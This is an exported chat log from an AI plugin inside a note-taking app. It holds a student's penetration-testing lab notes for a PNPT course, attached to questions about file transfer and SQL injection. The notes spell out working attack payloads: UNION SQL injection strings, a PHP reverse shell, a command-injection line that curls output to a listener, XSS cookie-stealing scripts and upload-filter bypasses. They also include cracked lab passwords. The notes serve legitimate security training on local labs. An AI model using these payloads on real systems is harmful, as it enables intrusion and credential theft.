@@ -1,0 +1,199 @@
+{
+  "id": "ae56582a-0c46-4e25-935e-8438f01d46c3",
+  "title": "@PNPT tell me how to transfer file from windows to",
+  "messages": [
+    {
+      "role": "user",
+      "content": {
+        "root": {
+          "children": [
+            {
+              "children": [],
+              "direction": null,
+              "format": "",
+              "indent": 0,
+              "type": "paragraph",
+              "version": 1,
+              "textFormat": 0,
+              "textStyle": ""
+            }
+          ],
+          "direction": null,
+          "format": "",
+          "indent": 0,
+          "type": "root",
+          "version": 1
+        }
+      },
+      "promptContent": [
+        {
+          "type": "text",
+          "text": "\n\n\n\n"
+        }
+      ],
+      "id": "5c22cc54-8ac5-4e52-837f-cd01d156a545",
+      "mentionables": []
+    },
+    {
+      "role": "assistant",
+      "content": "",
+      "id": "66638cce-bf78-4f27-852a-2e4ede7399b4",
+      "metadata": {}
+    },
+    {
+      "role": "user",
+      "content": {
+        "root": {
+          "children": [
+            {
+              "children": [
+                {
+                  "detail": 1,
+                  "format": 0,
+                  "mode": "token",
+                  "style": "",
+                  "text": "@File Transfer Methods.md",
+                  "type": "mention",
+                  "version": 1,
+                  "mentionName": "File Transfer Methods.md",
+                  "mentionable": {
+                    "type": "file",
+                    "file": "PNPT/PEH/Post Exploitation/File Transfer Methods.md"
+                  }
+                },
+                {
+                  "detail": 0,
+                  "format": 0,
+                  "mode": "normal",
+                  "style": "",
+                  "text": "  tell me how to transfer file from windows to kali?",
+                  "type": "text",
+                  "version": 1
+                }
+              ],
+              "direction": "ltr",
+              "format": "",
+              "indent": 0,
+              "type": "paragraph",
+              "version": 1,
+              "textFormat": 0,
+              "textStyle": ""
+            }
+          ],
+          "direction": "ltr",
+          "format": "",
+          "indent": 0,
+          "type": "root",
+          "version": 1
+        }
+      },
+      "promptContent": [
+        {
+          "type": "text",
+          "text": "```PNPT/PEH/Post Exploitation/File Transfer Methods.md\n![[Pasted image 20250401144455.png]]\n# Powershell Specific\n---\n- `Invoke-WebRequest 10.10.14.19:8000/reverse.exe -OutFile reverse.exe`\n# **Metasploit using Meterpreter**\n- `upload` / `download`\n\n# Transfer from Windows To Attacker Machine\n---\n- Start a **Python FTP server** on Kali:\n\t- `python3 -m pyftpdlib -p 21 --write`\n\t\t- `-p`: port\n\t\t- `--write`: give write access to connectors\n\t- If not present, install using:\n\t- `pip3 install pyftpdlib --break-system-packages`\n\t- ![[Pasted image 20250417152254.png]]\n- On Windows machine, access share:\n\t- `ftp 10.8.98.106`=> Kali IP\n\t- User: `anonymous`, Password: `anonymous`\n\t\t- ![[Pasted image 20250417152444.png]]\n\t- Upload the file using:\n\t\t- `put file_name`\n```\n\n\n@File Transfer Methods.md  tell me how to transfer file from windows to kali?\n\n"
+        }
+      ],
+      "id": "5a4c9bad-4b44-4500-9849-f1e16f40681f",
+      "mentionables": [
+        {
+          "type": "file",
+          "file": "PNPT/PEH/Post Exploitation/File Transfer Methods.md"
+        }
+      ]
+    },
+    {
+      "role": "assistant",
+      "content": "### Transfer from Windows to Kali\nTo transfer a file from Windows to Kali, you can use a Python FTP server. \n\n<smtcmp_block filename=\"PNPT/PEH/Post Exploitation/File Transfer Methods.md\" language=\"markdown\">\n### Transfer from Windows To Attacker Machine\n- Start a **Python FTP server** on Kali:\n  - `python3 -m pyftpdlib -p 21 --write`\n- On Windows machine, access share:\n  - `ftp 10.8.98.106`=> Kali IP\n  - User: `anonymous`, Password: `anonymous`\n  - Upload the file using:\n    - `put file_name`\n</smtcmp_block>\n\nReplace `10.8.98.106` with your Kali IP and `file_name` with the name of the file you want to transfer.",
+      "id": "4f716b0d-aa25-4098-bb74-f26aa67d8922",
+      "metadata": {
+        "model": {
+          "providerId": "groq",
+          "providerType": "groq",
+          "id": "69",
+          "model": "llama-3.3-70b-versatile"
+        }
+      }
+    },
+    {
+      "role": "user",
+      "content": {
+        "root": {
+          "children": [
+            {
+              "children": [
+                {
+                  "detail": 1,
+                  "format": 0,
+                  "mode": "token",
+                  "style": "",
+                  "text": "@Web App Enumeratioon",
+                  "type": "mention",
+                  "version": 1,
+                  "mentionName": "Web App Enumeratioon",
+                  "mentionable": {
+                    "type": "folder",
+                    "folder": "PNPT/PEH/Web App Enumeratioon"
+                  }
+                },
+                {
+                  "detail": 0,
+                  "format": 0,
+                  "mode": "normal",
+                  "style": "",
+                  "text": " Give me some payloads to check for SQLI",
+                  "type": "text",
+                  "version": 1
+                }
+              ],
+              "direction": "ltr",
+              "format": "",
+              "indent": 0,
+              "type": "paragraph",
+              "version": 1,
+              "textFormat": 0,
+              "textStyle": ""
+            }
+          ],
+          "direction": "ltr",
+          "format": "",
+          "indent": 0,
+          "type": "root",
+          "version": 1
+        }
+      },
+      "promptContent": [
+        {
+          "type": "text",
+          "text": "```PNPT/PEH/Web App Enumeratioon/Attacking Authentication/Lab - 1 Bruteforce.md\n# Tools\n---\n- `burpsuite, Hydra, ZAP, ffuf`\n- Use reasonably sized wordlist to **not get blocked** like `seclists`: `xato-net-10-million-passwords-1000.txt + 10000`\n\n# Burpsuite\n---\n- Intercept request\n- Send to **`intruder` (`ctrl + i`)**\n- Selec**t parameter to brute force (`password`) and then click `Add`**\n- Select a `wordlist` to bruteforce\n- Then **`filter` by length to find odd one out.**\n# FFUF\n---\n- Copy `request` into a file: `request.txt`\n\t- ![[Pasted image 20250407145942.png]]\n- **Rename parameter value to brute force to `FUZZ`. For example:- `password=FUZZ`**\n\t- ![[Pasted image 20250407150011.png]]\n- Filter by `size` using `-fs` param\n\t- `ffuf -request request_lab1.txt -request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt -fs 1814`\n\t- ![[Pasted image 20250407150150.png]]\n\t- ![[Pasted image 20250407150215.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/Attacking Authentication/Lab - 2 MFA.md\nThings to think about:\n- **Brute force the pin / Bruteforce the password**\n- **Change from backend**\n- **Weak tokens / Single token valid for all**\n\n# Exploitation\n---\n![[Pasted image 20250407152706.png]]\n- After generating the MFA, we're not able to change the `Username` field\n- Copy `jessamy`'s `MFA` code\n\t- ![[Pasted image 20250407152754.png]]\n- **We can now either use `burpsuite` or `edit and resend` request from `firefox`**\n- ==**Note:- Firefox method might not work always as code might expire after first use, better to modify very first request using burp==**\n- Firstly, login as `jessamy` to get the original `request`\n- ![[Pasted image 20250407152935.png]]\n- Then `edit` the username to `jeremy` and resend\n\t- ![[Pasted image 20250407153006.png]]\n\t- ![[Pasted image 20250407153019.png]]\n\n```\n```PNPT/PEH/Web App Enumeratioon/Attacking Authentication/Lab - 3 Challenge.md\n![[Pasted image 20250407153248.png]]\n- **Challenge**:- Find a valid account and login\n\n# Checklist from `appsecexplained`:\n---\n![[Pasted image 20250407154044.png]]\n\n# Exploitation\n---\n- Was **not able to solve myself**\n- Key point:\n\t- Since we have 5 attempts, **make a password list of 4 passwords**\n\t- But, **we can make list of any number of users**\n\t- ==Passwords hints: top 10 from `rockyou`, `xato`, name of the webapp (teashop), thecybermentor, etc.==\n- `ffuf -request request_lab3.txt -mode clusterbomb -request-proto http -w usernames.txt:FUZZ -w passwords.txt:FUZ2\"`\n\t- ![[Pasted image 20250407162527.png]]\n\t- ![[Pasted image 20250407162542.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/Capstone Web App.md\n- Challenge: **Find as many impactful vulnerabilities as you can and find information.**\n\n# DOM and stored XSS\n---\n- Signup and login as normal user\n- Add a comment:\n\t- `<H1> HI </H1>`\n\t- ![[Pasted image 20250407170712.png]]\n\t- ![[Pasted image 20250407171125.png]]\n- In `message` parameter:\n\t- ![[Pasted image 20250408033438.png]]\n\n# IDOR\n---\n- ![[Pasted image 20250407171211.png]]\n\n\n# Something\n---\n![[Pasted image 20250407171914.png]]\n\n# Bad design (modifiable fixed input)\n---\n![[Pasted image 20250408033718.png]]\n![[Pasted image 20250408033733.png]]\n\n# SQL Injection in `coffee.php?coffee=` parameter\n---\n![[Pasted image 20250408040925.png]]\n- `No coffee` found means injection didn't work, but it works:\n\t- ![[Pasted image 20250408041317.png]]\n- Extract data: 7 columns:\n\t- ![[Pasted image 20250408041605.png]]\n\t- Usernames: `'UNION+SELECT+NULL,NULL,NULL,NULL,NULL,username,NULL+from+users%23 `\n\t\t- ![[Pasted image 20250408041856.png]]\n\t- List of users:\n\t\t- `jeremy,jessamy,raj,bob,maria,amir,xinyi,kofi`\n\t- List of password hashes:\n\t`'UNION+SELECT+NULL,NULL,NULL,NULL,NULL,username,NULL+from+password%23 `\n\n\t\t```\n\t\t$2y$10$F9bvqz5eoawIS6g0FH.wGOUkNdBYLFBaCSzXvo2HTegQdNg/HlMJy\n\t\t$2y$10$meh2WXtPZgzZPZrjAmHi2ObKk6uXd2yZio7EB8t.MVuV1KwhWv6yS\n\t\t$2y$10$cCXaMFLC.ymTSqu1whYWbuU38RBN900NutjYBvCClqh.UHHg/XfFy\n\t\t$2y$10$ojC8YCMKX2r/Suqco/h.TOFTIaw5k3Io5FVSCeWjCCqL8GWwmAczC\n\t\t$2y$10$EPM4Unjn4wnn4SjoEPJu7em6OLISImA50QS3T1jCLyh48d7Pv6KBi\n\t\t$2y$10$qAXjb233b7CMHc69CU.8ueluFWZDt9f08.XYJjsJ.EfC/O5JGSOqW\n\t\t$2y$10$37gojoTFmj86E6NbENGg9e2Xu2z6OKKSgnjYxDkXJn/8dvSk2tKfG\n\t\t$2y$10$5sVvPfZOjzRTSeXJtQBGc.CfsDEwvITNkIg2IF9jSBhZZ1Rq.IK3.\n\t\t$2y$10$HBY/B4PCvsp4RR5HwKhUde5BaS7rQOX1yGmqfkXN9uq7/DQZZuyR2\n\t\t$2y$10$aWu4cu6YPfhpmSZcii9PRuY39sVU1tq7URmf198arbvQe0Gz.7.UK\n\t\t```\n# Weak passwords\n---\n- Cracking the passwords hashes:\n\t- `hashcat hashes.txt passwords.txt -m 3200` => bcrypt (O.S)\n\t\t- ![[Pasted image 20250408042943.png]]\n- Found later:\n\t- `5sVvPfZOjzRTSeXJtQBGc.CfsDEwvITNkIg2IF9jSBhZZ1Rq.IK3.:paris`\n- ==**Found `jeremy`'s password using only `hashcat`'s GPU cracking**==:\n\t- ![[Pasted image 20250408112205.png]]\n\t- `captain1`\n# Bruteforce\n---\n- Using `hydra` as it can **follow redirects**:\n\t- `hydra -L usernames.txt  -P passwords.txt localhost  http-post-form \"/capstone/auth.php:username=^USER^&password=^PASS^&auth=login:F=Login failed\" -v -t 64`\n\t\t- ![[Pasted image 20250408112449.png]]\n\n# Gobuster for directory bruteforce\n---\n`gobuster dir -u http://localhost/capstone/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -n -x php,txt,zip `\n![[Pasted image 20250408043357.png]]\n\n# Admin Panel (Using `jeremy : captain1`):\n---\n![[Pasted image 20250408112649.png]]\n\n# File Upload Vulnerability\n----\n- Uploading a normal `php` file throws error `Please upload a png file`\n\t- ![[Pasted image 20250408120702.png]]\n- How about we add `png` magic bytes in a shell?\n\t- ![[Pasted image 20250408120739.png]]\n\t- ==**Generally, only the upper text is needed, but in this challenge, adding the lower one was also required (this was form boundry :P)**==\n\t- And this was uploaded `successfully`\n- Finding the uploaded shell\n\t- This was the image of `coffee`, so we can look at where other `coffee` bean images are located from UI:\n\t\t- ![[Pasted image 20250408120935.png]]\n\t- These are **ordered, based on uploads**\n\t- My file was `19.php` (Note:- **Server only renames file name, not extension**)\n\t\t- ![[Pasted image 20250408121043.png]]\n\t- Let's get a reverse shell:\n\t\t- ![[Pasted image 20250408121156.png]]\n\t\t- ![[Pasted image 20250408121206.png]]\n\t\t- ![[Pasted image 20250408121225.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/Command Injection/Challenge Lab -3.md\n- Get command execution\n- If feasable, get reverse shell\n\n![[Pasted image 20250406162547.png]]\n\n# Information\n---\n- Enter `registration` number and new `coordinates` to move that vehicle to new location\n\t- ![[Pasted image 20250406162756.png]]\n- Shows executed command:\n\t ![[Pasted image 20250406162817.png]]\n\n\nExploitation\n---\n- Looks like a formula using `awk` utility:\n\t- `awk 'BEGIN {print sqrt( ((400-500)^2) + (( 105 - 500 )^2) )}'`\n- Our input is `500, 500` in this case\n- **Payload:**\n- ``\n\t```bash\n\t500 )^2) )}';curl http://172.19.0.1:9001/$(whoami);#\n\t```\n![[Pasted image 20250406165955.png]]\n```\n\n- ==**Note: While making payloads, just copy the whole remaining thing that comes after the input to start the payload with, here `500 )^2) )}'`==**\n\n# Shell\n---\n![[Pasted image 20250406170224.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/Command Injection/Introduction.md\n- Executes **code on server side**\n\t- `eval(1+1)`\n\t- `system`\n- ![[Pasted image 20250406105741.png]]\n- `appsecexplained.gitbook.io`\n```\n```PNPT/PEH/Web App Enumeratioon/Command Injection/Lab - 1 Basics.md\n![[Pasted image 20250406105931.png]]\n\n- My payload:\n\t- Since it uses `grep`, our output must contain `HTTP/` for it to print, so:\n\t\t- `localhost; echo \"HTTP/\" $(whoami)` or\n\t\t- `;whoami;echo HTTP/`\n\t- ![[Pasted image 20250406113115.png]]\n- TCM Academy payload\n\t- ==We can just fail the `curl` and `grep` command with invalid input==:\n\t\t- `;whoami;asdf`\n\t\t\t- ![[Pasted image 20250406113526.png]]\n\n\n# Reverse Shell\n---\n- **==Thing to notice is the technology. We should try getting shell using the technology web server is using. Here, it is `php`==**\n- `;php -r '$sock=fsockopen(\"172.17.0.1\",9001);system(\"sh <&3 >&3 2>&3\");';asdf`\n\t- Here `172.17.0.1` is **docker IP**\n\t- ![[Pasted image 20250406113907.png]]\n\n```\n```PNPT/PEH/Web App Enumeratioon/Command Injection/Lab - 2 Blind, Out of Band.md\n![[Pasted image 20250406155750.png]]\n\t- Trying: `localhost; whoami:` still works, but it should not as `localhostwww-data` is not a website\n\t![[Pasted image 20250406160755.png]]\n\t==- Maybe **`;` is `filtered`.** We can use `backtick` or `$(cmd)` or even `\\n` for new command:==\n\t\t- `backticks`\n\t\t- `\\n` => [[http://localhost\\n curl http://172.19.0.1:9001/`whoami`]]\n\t\t- `$(cmd)` \n\t\t- `&&`\n\t\t- `|`\n\t\t ![[Pasted image 20250406160328.png]]\n\n# Getting output by sending on address\n---\n```python\nhttp://172.19.0.1:9001/`whoami` \n```\n- This will try to reach our IP and try to get the output of `whoami` command i.e. `www-data`: [http://172.19.0.1:9001/www-data]\n- `nc -lnvp 9001`\n![[Pasted image 20250406161017.png]]\n![[Pasted image 20250406161239.png]]\n\n\n# Getting the shell\n---\n- Upload the shell and get the shell easily\n- ![[Pasted image 20250406161911.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/File Upload/Lab - 1 Basics.md\n![[Pasted image 20250407103534.png]]\n\n# Information\n---\n- Looking at the `network` tab, we can see that hitting `Browser` and selecting a file **does not make any `server` side requests.**\n- ==This means, the check is done client side only using `js`.== This is a good indicator that we can bypass this.\n\t- ![[Pasted image 20250407103757.png]]\n- We can see the `js` code using `view page source`:\n\t```js\n\t <script>\n\t    function validateFileInput(input) {\n\t        var validExtensions = ['jpg', 'png'];\n\t        var fileName = input.files[0].name;\n\t        var fileNameExt = fileName.substr(fileName.lastIndexOf('.') + 1);\n\t        if (!validExtensions.includes(fileNameExt.toLowerCase())) {\n\t            input.value = '';\n\t            alert(\"Only '.jpg' and '.png' files are allowed.\");\n\t        }\n\t    }\n\t    </script>\n\t```\n\t- The code checks that extension must be `jpg` or `png`.\n- ==After `selecting` the file, we can change its extension using `burpsuite` before it reaches the server.==\n\n# Exploitation\n---\n- Rename reverse `shell.php` to `shell.png`.\n\t- ![[Pasted image 20250407104603.png]]\n- Select `Browser` and select `shell.png` and then `upload`\n- Intercept this request in `burpsuite` and then change the file name to `shell.php`\n\t- ![[Pasted image 20250407105103.png]]\n\t- ![[Pasted image 20250407105119.png]]\n\t- ![[Pasted image 20250407105148.png]]\n- Find the file and access it through browser\n\t- ![[Pasted image 20250407105304.png]]\n- Most likely in http://localhost/labs/uploads folder => http://localhost/labs/uploads/shell.php\n\t- ![[Pasted image 20250407105409.png]]\n\n```\n```PNPT/PEH/Web App Enumeratioon/File Upload/Lab - 3 Challenge.md\n- Trying previous `magic bytes` technique:\n\t- ![[Pasted image 20250407143553.png]]\n- Does not seem to be working, there are additional checks\n- From the sentence: `The file extension '.php' is not allowed.`, **looks like there is `deny` list** on the **server side.**\n\n# Exploitation\n---\n- Extensions like:\n\t- ![[Pasted image 20250407143927.png]]\n- **Can be used to bypass `php` blacklist**\n- ==**Let's rename from `shell_modified_2.jpg` to `shell_modified_2.phtml` in `burpsuite`==**\n\t- ![[Pasted image 20250407144034.png]]\n- `http://localhost/labs/uploads/shell_modified_2.phtml`\n- ![[Pasted image 20250407144117.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/File Upload/Lab -2 Magic Bytes.md\n![[Pasted image 20250407135303.png]]\n\n# Information\n- Let's try previous method by renaming it in `burpsuite`:\n\t- ![[Pasted image 20250407135626.png]]\n- **This means there is some kind of server side processing**\n\n\n# Magic Bytes\n---\n- **Magic Bytes of `png`** in hex are `89 50 4E 47 0D 0A 1A 0A`\n- **Magic Bytes of `jpg`** in hex are `FF D8 FF E0`\n- Or ==we can **just use `burpsuite`** to upload normal `png` file and then **replace `png` contents with `php` contents** **(except for Magic Bytes `PNG IDHR`)**==\n- Also, **rename file to `shell.php`** as there is **also previous`client` side check** \n- Intercept in `burpsuite`\n\t- ![[Pasted image 20250407141020.png]]\n- Add the `shell.php` code after the `IDHR` line:\n\t- ![[Pasted image 20250407141254.png]]\n- NOTE :- this worked in video, but not for me (maybe as he used a simple command shell). I will try the `hexeditor` method\n- Used `jpg` magic bytes \n- ![[Pasted image 20250407142555.png]]\n- ![[Pasted image 20250407142522.png]]\n- `http://localhost/labs/uploads/shell_modified_2.php`\n- ![[Pasted image 20250407142719.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/File Upload/Points to note.md\n- Try the following :\n\t- Renaming file from `file.png` to `file.php` after pressing upload in `burpsuite`\n\t- Renaming file from `file.php` to `file.png.php` and then uploading\n\t- Renaming file from `file.php` to `file.php%00.png` after/before pressing upload in `burpsuite`\n\t- Renaming file from `file.php` to `file.php.png` after/before pressing upload (might work in cases of `regex` search)\n\t- Changing a number of letters to their capital forms to bypass case sensitive rules (e.g. `“file.aSp” or “file.PHp3”`).\n\t- Trying different `php` extensions like `asd`, `phtml`, `php2`, `php3`, etc.\n\t- `Content-Type` in burpsuite\n\t- Try `Magic Bytes`\n- More in :\n\t- **https://portswigger.net/web-security/file-upload**\n\t- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload\n\t- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md\n```\n```PNPT/PEH/Web App Enumeratioon/IDOR, BOLA/Bruteforce Script.md\n```python\nimport requests\n\ncookies = {\n    'admin_cookie': '5ac5355b84894ede056ab81b324c4675',\n}\n\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n    'Accept-Language': 'en-US,en;q=0.5',\n    'Connection': 'keep-alive',\n    'Upgrade-Insecure-Requests': '1',\n    'Priority': 'u=0, i',\n}\n\n\n\nid_list = open('id_list.txt', 'r').readlines()\n\n\nfor id_num in id_list:\n    params = {'account': id_num,}\n    response = requests.get(f'http://localhost/labs/e0x02.php', params=params, cookies=cookies, headers=headers)\n    if 'admin' in response.text.lower():\n        print(f\"[+] Found Possible admin user with ID : {id_num}\")\n```\n```\n```PNPT/PEH/Web App Enumeratioon/IDOR, BOLA/IDOR - Insecure Direct Object Reference.md\n- Access control issue where **we can request a resource with an object ID** and it **returns some information of the object**. For example, user ids, product ids, order ids, etc\n- Test for IDOR:- find a point **==where we can manipulate ID and then change it==** \n\n# Exploitation\n---\n![[Pasted image 20250407164432.png]]\n- Change id to `1009`:\n\t- ![[Pasted image 20250407164504.png]]\n- Automation using `ffuf`:\n\t- make a list of IDs till `2000` using python: `python3 -c \"for i in range(2001): print(i)\" >> id_list.txt`\n\t- `ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w id_list.txt -fw 189`\n\t- ![[Pasted image 20250407164740.png]]\n\n# Challenge - Identify Admin Accounts\n---\n- Copy `Get` request as `cURL`\n\t- ![[Pasted image 20250407164835.png]]\n- Convert [curl to python](https://curlconverter.com/)\n\t- ![[Pasted image 20250407164931.png]]\n- Script Linked [[Bruteforce Script]]\n\t- ![[Pasted image 20250407165605.png]]\n- ![[Pasted image 20250407165844.png]]\n- ![[Pasted image 20250407165854.png]]\n- ![[Pasted image 20250407165904.png]]\n- ![[Pasted image 20250407165917.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/Lab Setup.md\n- `sudo apt install docker.io`\n- `sudo apt install docker-compose`\n- `wget https://cdn.fs.teachablecdn.com/CbIyLkOuS4GUH7TNFTFg`\n- `mv CbIyLkOuS4GUH7TNFTFg  peh-web-labs.tar.gz`\n- `tar -xf peh-web-labs.tar.gz`\n- `cd labs`\n- `sudo docker-compose up -d` \n\t- `-d` for background\n- `./set-permissions.sh`\n- Browse to `http://localhost`\n- ![[Pasted image 20250405144911.png]]\n- **Note**: It was giving error on browser, so run this \n\t- `sudo docker-compose down -v`\n\t- `sudo docker-compose up --build`\n\t- This will **delete all existing database data**, which is fine if you don't need to keep it.`\n- **To reset lab** (required first time):\n\t- Goto : `localhost/init.php`\n\nBrowse containers\n---\n- Running containers:\n\t- `sudo docker ps -a`\n- Stop all containers:\n\t- `sudo docker-compose stop`\n- Remove container:\n\t- `sudo docker rm <id>`\n```\n```PNPT/PEH/Web App Enumeratioon/Resource.md\nhttps://appsecexplained.gitbook.io/appsecexplained\n- **Follow checklists**\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/\n- [XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/)\n```\n```PNPT/PEH/Web App Enumeratioon/SQL Injection/BLIND injection part - 1.md\n- Pay **attention to `content-length` or `search` in response** (in burp or browser).\n\t- This changes based on response.\n- Trying basic things didn't work, therefore bootup `burpsuite`\n- **==Make sure to look at everything that our client sends or browser requests (could be session ids, some plugin, cookies, etc.)==**\n\n\n# Burpsuite\n---\n- Login with given creds `jeremy:jeremy`\n- Forward first `post` request\n- For valid data:\n\t- ![[Pasted image 20250405165938.png]]\n- For invalid data:\n\t- ![[Pasted image 20250405170133.png]]\n\n - **Let's try basic injection**\n ---\n - **Works** :\n\t - ![[Pasted image 20250405170314.png]]\n- **Good idea to url encode payload (Ctrl + U) as well, but here it works without it.**\n\n# Extracting Data\n- Number of columns being selected:\n\t- `somedata' UNION SELECT NULL,NULL,NULL,NULL#` => 4\n\t- ![[Pasted image 20250405170514.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/SQL Injection/SQL Injection Challenge.md\n![[Pasted image 20250406034038.png]]\n- **Search parameter can be injectable, let's see**\n- Giving `invalid_product` gives `No Products found`:\n\t- ![[Pasted image 20250406035253.png]]\n- **If injection is successful,** **we should not receive** `No products found`\n- ![[Pasted image 20250406035352.png]]\n- ==**Works, but it is blind SQL injection**==\n\n# Extracting Details\n---\n- Number of columns being selected: 4\n\t- ![[Pasted image 20250406035546.png]]\n- Name of database: `peh-labs`\n\t- ![[Pasted image 20250406041436.png]]\n\t- ![[Pasted image 20250406041505.png]]\n\n- Name of tables given in `video` for easy manual injection:\n\t- ![[Pasted image 20250406042149.png]]\n- Column names: `username` and `password`\n\t- `product=invalid_product' UNION SELECT NULL,NULL,NULL,column_name from information_schema.columns where table_name='injection0x03_users' AND table_schema='peh-labs' AND column_name='password' LIMIT 1#`\n\t- ![[Pasted image 20250406043315.png]]\n\t- ![[Pasted image 20250406043349.png]]\n- Username: `takeshi`\n\t- ![[Pasted image 20250406044616.png]]\n- Password: `onigirigadaisuki`\t\n\t- ![[Pasted image 20250406044803.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/SQL Injection/UNION injection.md\n- Using comments\n\t- `jeremy' or 1=1#`\n\t- `jeremy' OR 1=1-- -`\n# Using Union\n---\n- Only works when ==**both sides have equal columns in selection with same data type**==\n- Can use `NULL(int)` for **type cast**\n  \n- **Detecting number of columns from first query**\n---\n- Try **adding `NULL` until we get some records** (null matches with every data type) \n\t- `jeremy' UNION select NULL,NULL,NULL#\n\t\t![[Pasted image 20250405155557.png]]\n\t- Even though we see only 2 columns (name and email), in **==backend there can be more columns.==**\n\n- **Getting useful information**\n---\n- `jeremy' UNION select NULL,NULL,version()#` -> DB version\n- `jeremy' UNION select NULL,NULL,table_name from information_schema.tables#` -> All tables\n- `jeremy' UNION select NULL,NULL,column_name from information_schema.columns#`-> All columns\n- `jeremy' UNION SELECT NULL, table_name, NULL FROM information_schema.columns WHERE column_name='username'#` -> **get table name from column name**\n\n- Getting password:\n\t- `jeremy' UNION select NULL,NULL,password from injection0x01#`\n\t- ![[Pasted image 20250405160232.png]]\n\n\n# SQLMap\n---\n![[Pasted image 20250406032324.png]]\n![[Pasted image 20250406032355.png]]\n- `sqlmap -r request.txt --level=2`\n- ![[Pasted image 20250406032855.png]]\n\n\n- Let's dump everything using:\n\t- `sqlmap -r request.txt --level=2 --dump`\n\t- ![[Pasted image 20250406033307.png]]\n\t- ![[Pasted image 20250406033344.png]]\n\t- ![[Pasted image 20250406033406.png]]\n\t- Specify table name using:\n- ---\n        ![[Pasted image 20250406033735.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/Subdomain Enumeration.md\n# Good sub domains:\n---\n- ==**`test`, `stag`, `dev`, `admin` ...==**\n# Using assetfinder\n---\n- **Installation**:\n\t- `go mod init github.com/tomnomnom/assetfinder`\n\t- `go install github.com/tomnomnom/assetfinder@latest`\n- **Usage:**\n\t- `assetfinder domain.com` => might be owned by tesla\n\t- `assetfinder --subs-only domain.com` => only related to domain.com\n\n# Using amass\n---\n- **[Installation](https://github.com/owasp-amass/amass/blob/master/doc/install.md):**\n\t- `go install -v github.com/owasp-amass/amass/v4/...@master`\n- **Usage:**\n\t- `amass enum -d domain.com`\n\n# Using httprobe : if the found hosts are alive\n---\n- **Installation:**\n\t- `go install github.com/tomnomnom/httprobe@latest`\n- **Usage:**\n\t- `cat file_with_sub_domains.txt | httprobe`\n\n# Using gowitness (screenshots of websites)\n---\n- `go install github.com/sensepost/gowitness@latest`\n- `gowitness single https://domain.com`\n\n# Using subjack\n---\n- `go get github.com/haccer/subjack`\n- `subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl`\n# Automation\n---\n- Automation script by TCM : https://pastebin.com/MhE6zXVt\n- More at: ![[Pasted image 20250402143951.png]]\n\n\t```bash\n\twhois tcm-sec.com\n\tsubfinder -d tcm-sec.com\n\tassetfinder tcm-sec.com\n\tamass enum -d tcm-sec.com\n\tcat tesla.txt | sort -u | httprobe -s -p https:443\n\tgowitness file -f ./alive.txt -P ./pics --no-http\n```\n![[Pasted image 20250411165251.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/XSS/Challenge - Steal Admin Cookie.md\n- Goto `localhost/labs/x0x03_admin.php` where `admin` can see all the support tickets\n\t- ![[Pasted image 20250406101654.png]]\n- Steal the admin cookie\n\t- ![[Pasted image 20250406101714.png]]\n- Set 2 containers as:\n\t- ![[Pasted image 20250406101826.png]]\n\n# Exploitation\n---\n- Payload is:\n```html\n<script>window.location=\"http://localhost:9002/?cookie=\" + document.cookie</script>\n```\n\tOR\n```html\n<script> var i = new Image;i.src=\"http://localhost:9002\"+document.cookie;</script>\n```\n\n- Setup a `nc` listener on port `9002`\n\t- `nc -lnvp 9002`\n\n- On Hacker container:\n\t- `<script>window.location=\"http://localhost:9002/?cookie=\" + document.cookie</script>`\n\t- ![[Pasted image 20250406103110.png]]\n- On Admin container `refresh`\n- On terminal:\n\t- ![[Pasted image 20250406103026.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/XSS/DOM (Lab - 1).md\n![[Pasted image 20250406061253.png]]\n\n- **==Normal payloads like `<script> prompt(1) </script>` does not work here as this is not sent anywhere (unlike reflected). This is only stored in client browser.==**\n- `<img src=x onerror=prompt(1)>`\n- `<img src=x onerror=\"window.location.href='https://stackoverflow.com/'\">`\n```\n```PNPT/PEH/Web App Enumeratioon/XSS/Some Points.md\n- **Note**:- **Avoid using `alert(1)`** as it is blocked a lot of times.\n\t- Use **`print()` or `prompt(hello)`**\n- A **keylogger**:\n\t- ![[Pasted image 20250406060909.png]]\n\t- This is only for local, we can use **`fetch` API** for getting input from other source.\n- Test for **`html` injection** first for verification.\n```\n```PNPT/PEH/Web App Enumeratioon/XSS/Stored XSS (Lab -2).md\n- Use **firefox containers** so we can use **multiple users.**\n\t- ![[Pasted image 20250406100447.png]]\n- ![[Pasted image 20250406100610.png]]\n- ![[Pasted image 20250406100655.png]]\n\n\n# Exploitation\n---\n- In first container:\n\t ![[Pasted image 20250406100855.png]]- ![[Pasted image 20250406100841.png]]\n- In second container, we can see this comment:\n\t- ![[Pasted image 20250406100938.png]]\n\n\n- In First container:\n\t- `<script> prompt(1) </script>`\n\t\t- ![[Pasted image 20250406101030.png]]\n- In Second container (after refresh):\n\t- ![[Pasted image 20250406101049.png]]\n\n\n# Grabbing Cookie\n---\n- Set a cookie on second container:\n\t- ![[Pasted image 20250406101323.png]]\n- On First container:\n\t- `<script>alert(document.cookie)</script>`\n\t- ![[Pasted image 20250406101410.png]]\n- On Second container again:\n\t- ![[Pasted image 20250406101445.png]]\n```\n```PNPT/PEH/Web App Enumeratioon/XSS/Types of XSS.md\n- **Reflected**\n---\n\t- When request comes from current `HTTP` request\n\t- **Script is included in the response from the server**\n\t- **==We can only target ourselves or if someone can click this to steal 